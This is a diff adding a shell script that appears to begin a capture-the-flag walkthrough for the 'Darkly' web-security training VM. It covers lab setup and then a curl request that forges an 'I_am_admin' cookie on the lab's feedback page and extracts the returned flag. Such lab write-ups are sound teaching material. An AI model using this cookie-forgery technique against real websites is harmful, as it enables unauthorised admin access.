@@ -1,0 +1,31 @@
+#!/usr/bin/env rc
+### Dimly is a web security based project aimed to teach you
+### the basics of web exploitation and all that jazz.
+### by Aren R. Windham and Clayton D. Allen
+
+### each section is preceded by a description of the vulnerability
+### as well as a code block that demonstraits it.
+
+## SECTION ONE - HOW TO SETUP
+# 1 - Download the ISO
+#    - `https://projects.intra.42.fr/uploads/document/document/307/Darkly_i386.iso'
+# 2 - create a new VirtualBox guest machine.
+#   - The iso says that it's 32 bit but if the machine isn't 64 bit it won't boot.
+# 3 - set the iso as it's storage device.
+# 4 - change the main network adapter from NAT to Host-only
+
+darkly_ip=192.168.56.101
+
+## SECTION TWO - EXPLOITATIONS AND SOLUTIONS
+# scope - http://$darkly_ip/index.php?page=feedback
+# issue
+#	submitting a feedback with the cookie I_am_admin with a value of
+#	68934a3e9455fa72420237eb05902327
+# solution:
+#	lol idk
+echo -n '1: '
+curl -s 'http://'$darkly_ip'/index.php?page=feedback' \
+-H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \
+--data 'txtName=a&mtxtMessage=a&btnSign=Sign+Guestbook' \
+| grep -E -oh '[a-f0-9]{64}' \
+| head -n 1
